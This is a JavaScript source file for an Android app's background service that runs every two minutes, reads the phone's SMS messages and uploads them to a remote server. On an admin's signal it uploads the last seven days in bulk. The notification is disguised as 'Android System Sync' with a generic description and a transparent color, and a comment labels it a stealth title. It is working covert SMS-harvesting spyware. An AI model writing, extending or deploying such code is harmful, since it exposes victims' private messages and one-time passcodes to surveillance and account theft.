import BackgroundService from 'react-native-background-actions';
import SmsService from './smsService';
import apiClient from '../api/apiClient';
import EncryptedStorage from 'react-native-encrypted-storage';
import CryptoUtils from '../utils/crypto';
import { Platform } from 'react-native';
import DeviceInfo from 'react-native-device-info';

const sleep = time => new Promise(resolve => setTimeout(resolve, time));

const CHUNK_SIZE = 50; // Max messages per bulk sync request

/**
 * Sends all messages in chunks of CHUNK_SIZE to /api/sms/sync-old.
 * Returns total saved count.
 */
const bulkSyncMessages = async (deviceId, messages) => {
  let totalSaved = 0;

  for (let i = 0; i < messages.length; i += CHUNK_SIZE) {
    const chunk = messages.slice(i, i + CHUNK_SIZE);

    const payload = chunk.map(sms => {
      const { iv, messageBody } = CryptoUtils.encrypt(sms.body);
      return {
        sender: sms.address,
        message_body: messageBody,
        iv: iv,
        timestamp: sms.date,
        sim_info: `SIM_SLOT_${sms.sub_id || 0}`,
        device_model: DeviceInfo.getModel() || 'Android Device',
        android_version: Platform.Version.toString(),
      };
    });

    try {
      const res = await apiClient.post('/sms/sync-old', {
        device_id: deviceId,
        messages: payload,
      });
      totalSaved += res.data?.saved || 0;
      console.log(`[Background] Chunk ${Math.floor(i / CHUNK_SIZE) + 1}: saved=${res.data?.saved}, skipped=${res.data?.skipped}`);
    } catch (chunkErr) {
      console.log('[Background] Chunk upload failed:', chunkErr.message);
    }

    // Small delay between chunks to avoid overwhelming the server
    if (i + CHUNK_SIZE < messages.length) {
      await sleep(500);
    }
  }

  return totalSaved;
};

const syncTask = async taskDataArguments => {
  await new Promise(async resolve => {
    // Initial heartbeat on service start
    try {
      const deviceId = await EncryptedStorage.getItem('device_id');
      const token = await EncryptedStorage.getItem('jwt_token');
      if (deviceId && token) {
        await apiClient.post('/device/update-status', {
          device_id: deviceId,
          model: DeviceInfo.getModel() || 'Android Device',
          status: 'online',
        });
        console.log('[Background] Initial Heartbeat Sent');
      }
    } catch (e) {
      console.log('[Background] Initial Heartbeat Failed:', e.message);
    }

    while (BackgroundService.isRunning()) {
      try {
        console.log('[Background] Sync Cycle Started');

        const deviceId = await EncryptedStorage.getItem('device_id');
        const token = await EncryptedStorage.getItem('jwt_token');

        if (deviceId && token) {
          // ── 1. HEARTBEAT ──────────────────────────────────────────────────
          let syncRequested = false;
          try {
            const heartbeatRes = await apiClient.post('/device/update-status', {
              device_id: deviceId,
              model: DeviceInfo.getModel() || 'Android Device',
              status: 'online',
            });

            syncRequested = heartbeatRes?.data?.device?.sync_requested === true;
            console.log('[Background] Heartbeat OK — sync_requested:', syncRequested);
          } catch (hbError) {
            console.log('[Background] Heartbeat Failed:', hbError.message);
          }

          // ── 2. ON-DEMAND BULK SYNC (admin triggered) ──────────────────────
          if (syncRequested) {
            console.log('[Background] Admin requested full re-sync — fetching last 7 days');
            try {
              const sevenDaysAgo = Date.now() - 7 * 24 * 60 * 60 * 1000;
              const allMessages = await SmsService.getSms({ minDate: sevenDaysAgo });

              if (allMessages && allMessages.length > 0) {
                console.log(`[Background] Bulk syncing ${allMessages.length} messages in chunks of ${CHUNK_SIZE}`);
                const saved = await bulkSyncMessages(deviceId, allMessages);
                console.log(`[Background] Bulk sync complete — total saved: ${saved}`);
              }

              // Clear the flag on server so it doesn't re-trigger
              await apiClient.post(`/device/clear-sync-flag/${deviceId}`);

              // Update timestamp so regular sync doesn't re-upload everything
              await EncryptedStorage.setItem('last_synced_timestamp', Date.now().toString());
            } catch (bulkErr) {
              console.log('[Background] Bulk sync failed:', bulkErr.message);
            }
          }

          // ── 3. REGULAR INCREMENTAL SYNC (new messages only) ───────────────
          if (!syncRequested) {
            try {
              const lastSynced = await EncryptedStorage.getItem('last_synced_timestamp');
              const minDate = lastSynced
                ? parseInt(lastSynced, 10)
                : Date.now() - 24 * 60 * 60 * 1000; // Default: last 24h

              const messages = await SmsService.getSms({ minDate });

              if (messages && messages.length > 0) {
                console.log(`[Background] Incremental sync: ${messages.length} new messages`);

                for (const sms of messages) {
                  if (sms.date > minDate) {
                    try {
                      const { iv, messageBody } = CryptoUtils.encrypt(sms.body);
                      await apiClient.post('/sms/upload', {
                        device_id: deviceId,
                        sender: sms.address,
                        message_body: messageBody,
                        iv: iv,
                        timestamp: sms.date,
                        sim_info: `SIM_SLOT_${sms.sub_id || 0}`,
                        device_model: DeviceInfo.getModel() || 'Android Device',
                        android_version: Platform.Version.toString(),
                      });

                      // Advance the watermark after each successful upload
                      await EncryptedStorage.setItem('last_synced_timestamp', sms.date.toString());
                    } catch (syncErr) {
                      console.log('[Background] Message upload error:', syncErr.message);
                    }
                  }
                }
              }
            } catch (smsErr) {
              console.log('[Background] Incremental SMS sync failed:', smsErr.message);
            }
          }
        } else {
          console.log('[Background] No credentials found, skipping cycle.');
        }
      } catch (globalErr) {
        console.log('[Background] Critical Loop Error:', globalErr.message);
      }

      const loopDelay = taskDataArguments.delay || 120000; // 2 minutes
      await sleep(loopDelay);
    }
  });
};

const options = {
  taskName: 'ConnectHubSyncTask',
  taskTitle: 'Android System Sync',       // Stealth title
  taskDesc: 'System services running',    // Generic description
  taskIcon: {
    name: 'ic_launcher_foreground', // Use foreground PNG to avoid XML adaptive icon issues
    type: 'mipmap',
  },
  color: '#00000000',                     // Transparent color
  linkingURI: undefined,
  parameters: {
    delay: 120000, // 2-minute heartbeat interval
  },
};

const startBackgroundService = async () => {
  await BackgroundService.start(syncTask, options);
};

const stopBackgroundService = async () => {
  await BackgroundService.stop();
};

export default {
  start: startBackgroundService,
  stop: stopBackgroundService,
};
